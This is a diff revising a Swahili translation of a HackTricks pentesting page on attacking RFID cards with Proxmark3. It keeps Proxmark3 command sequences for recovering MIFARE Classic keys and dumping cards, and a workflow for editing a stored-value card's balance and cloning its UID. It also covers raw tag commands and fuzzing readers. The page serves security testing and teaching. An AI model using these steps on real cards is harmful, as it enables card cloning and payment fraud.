@@ -2,17 +2,17 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Kushambulia Mfumo za RFID kwa Proxmark3
+## Kushambulia Mifumo ya RFID kwa kutumia Proxmark3
 
-Kitu cha kwanza unachohitaji kufanya ni kuwa na [**Proxmark3**](https://proxmark.com) na [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).
+Jambo la kwanza unalohitaji kufanya ni kuwa na [**Proxmark3**](https://proxmark.com) na [**kusakinisha software na dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).
 
 ### Kushambulia MIFARE Classic 1KB
 
-Ina **16 sectors**, kila moja yao ina **4 blocks** na kila block ina **16B**. UID iko katika sector 0 block 0 (na haiwezi kubadilishwa).\
-Ili kufikia kila sector unahitaji **2 keys** (**A** na **B**) ambazo zimetunzwa katika **block 3 of each sector** (sector trailer). Sector trailer pia inahifadhi **access bits** zinazotoa ruhusa za **read and write** kwenye **each block** zikitumia 2 keys.\
-2 keys zinafaa kutoa ruhusa za kusoma ikiwa unajua key ya kwanza, na ruhusa za kuandika ikiwa unajua key ya pili (kwa mfano).
+Ina **sectors 16**, kila moja ikiwa na **blocks 4**, na kila block ikiwa na **16B**. UID iko katika sector 0 block 0 (na haiwezi kubadilishwa).\
+Ili kufikia kila sector unahitaji **keys 2** (**A** na **B**) ambazo zimehifadhiwa katika **block 3 ya kila sector** (sector trailer). Sector trailer pia huhifadhi **access bits** zinazotoa ruhusa za **kusoma na kuandika** kwenye **kila block** kwa kutumia keys hizo 2.\
+Keys 2 ni muhimu ili kutoa ruhusa ya kusoma ikiwa unajua ya kwanza, na kuandika ikiwa unajua ya pili (kwa mfano).
 
-Shambulizi kadhaa zinaweza kufanywa
+Mashambulizi kadhaa yanaweza kufanywa<sup>[[1]](#references)</sup>.
 ```bash
 proxmark3> hf mf #List attacks
 
@@ -31,11 +31,11 @@ proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to
 proxmark3> hf mf eget 01 # Read block 1
 proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
 ```
-The Proxmark3 inaruhusu kufanya vitendo vingine kama **eavesdropping** ya **Tag to Reader communication** ili kujaribu kupata data nyeti. Katika kadi hii unaweza tu sniff mawasiliano na kuhesabu ufunguo uliotumika kwa sababu **cryptographic operations used are weak** na ukijua plain and cipher text unaweza kuuhesabu (`mfkey64` tool).
+Proxmark3 inaruhusu kufanya vitendo vingine kama **eavesdropping** kwenye **Tag to Reader communication** ili kujaribu kupata data nyeti. Katika kadi hii, unaweza kunusa tu mawasiliano na kukokotoa key iliyotumika kwa sababu **cryptographic operations zinazotumika ni dhaifu**, na ukijua plain text na cipher text unaweza kuikokotoa (`mfkey64` tool).<sup>[[3]](#references)</sup>
 
-#### MiFare Classic mtiririko mfupi wa kazi kwa utumiaji mbaya wa thamani iliyohifadhiwa
+#### MiFare Classic quick workflow kwa matumizi mabaya ya stored-value
 
-Wakati terminals zinapohifadhi salio kwenye kadi za Classic, mtiririko wa kawaida kutoka mwanzo hadi mwisho ni:
+Wakati terminals zinahifadhi salio kwenye kadi za Classic, mtiririko wa kawaida wa mwanzo hadi mwisho ni:<sup>[[4]](#references)</sup>
 ```bash
 # 1) Recover sector keys and dump full card
 proxmark3> hf mf autopwn
@@ -51,19 +51,19 @@ proxmark3> hf mf csetuid -u <original_uid>
 ```
 Vidokezo
 
-- `hf mf autopwn` inasimamia nested/darkside/HardNested-style attacks, inapata keys, na huunda dumps katika client dumps folder.
-- Kuandika block 0/UID kunaweza kufanya kazi tu kwenye magic gen1a/gen2 cards. Kadi za Classic za kawaida zina UID ya read-only.
-- Mipangilio mingi hutumia Classic "value blocks" au simple checksums. Hakikisha kuwa all duplicated/complemented fields na checksums zinabaki zikiwa sawia baada ya uhariri.
+- `hf mf autopwn` huendesha mashambulizi ya mtindo wa nested/darkside/HardNested, hurejesha keys, na huunda dumps katika folda ya client dumps.
+- Kuandika block 0/UID hufanya kazi tu kwenye kadi za magic gen1a/gen2. Kadi za kawaida za Classic zina UID ya kusomeka tu.<sup>[[2]](#references)</sup>
+- Deployments nyingi hutumia **value blocks** za Classic au checksums rahisi. Hakikisha sehemu zote zilizorudiwa/kukamilishwa na checksums zinaendana baada ya kuhariri.
 
-Tazama mbinu ya kiwango cha juu na hatua za kuzuia katika:
+Tazama methodology ya kiwango cha juu na mitigations katika:
 
 {{#ref}}
 pentesting-rfid.md
 {{#endref}}
 
-### Amri Mbichi
+### Amri Ghafi
 
-Sistimu za IoT wakati mwingine hutumia **tags zisizo za chapa au zisizo za kibiashara**. Katika kesi hii, unaweza kutumia Proxmark3 kutuma **amri mbichi maalum kwa tags**.
+Mifumo ya IoT wakati mwingine hutumia **tags zisizo na chapa au zisizo za kibiashara**. Katika hali hii, unaweza kutumia Proxmark3 kutuma **amri maalum za raw kwa tags**.
 ```bash
 proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
 SAK : 08 [2]
@@ -73,21 +73,21 @@ No chinese magic backdoor command detected
 Prng detection: WEAK
 Valid ISO14443A Tag Found - Quiting Search
 ```
-Kwa taarifa hizi unaweza kujaribu kutafuta taarifa kuhusu kadi na kuhusu jinsi ya kuwasiliana nayo. Proxmark3 inaruhusu kutuma amri ghafi kama: `hf 14a raw -p -b 7 26`
+Kwa maelezo haya, unaweza kujaribu kutafuta taarifa kuhusu kadi na kuhusu jinsi ya kuwasiliana nayo. Proxmark3 inaruhusu kutuma amri ghafi kama: `hf 14a raw -p -b 7 26`
 
-### Skripti
+### Scripts
 
-Programu ya Proxmark3 inakuja na orodha iliyopakiwa mapema ya **skripti za otomatiki** ambazo unaweza kutumia kutekeleza kazi rahisi. Ili kupata orodha kamili, tumia amri `script list`. Kisha, tumia amri `script run`, ikifuatiwa na jina la skripti:
+Software ya Proxmark3 huja na orodha iliyopakiwa awali ya **automation scripts** unazoweza kutumia kutekeleza kazi rahisi. Ili kupata orodha kamili, tumia amri ya `script list`. Kisha, tumia amri ya `script run`, ikifuatiwa na jina la script:
 ```
 proxmark3> script run mfkeys
 ```
-Unaweza kuunda script ya **fuzz tag readers**; kwa kunakili data ya **valid card**, andika tu **Lua script** inayofanya **randomize** kwa mmoja au zaidi wa **bytes** za nasibu, kisha angalia ikiwa **reader crashes** kwa mzunguko wowote.
+Unaweza kuunda script ya **fuzz tag readers**, kwa hiyo baada ya kunakili data ya **valid card**, andika tu **Lua script** inayobadilisha bila mpangilio **bytes** moja au zaidi, kisha uangalie ikiwa **reader ina-crash** katika iteration yoyote.
 
 ## Marejeo
 
-- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
-- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
-- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
-- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
+- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
+- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
+- [3] [Taarifa ya NXP kuhusu MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
+- [4] [Unyonyaji wa udhaifu wa NFC card katika KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
 
 {{#include ../../banners/hacktricks-training.md}}
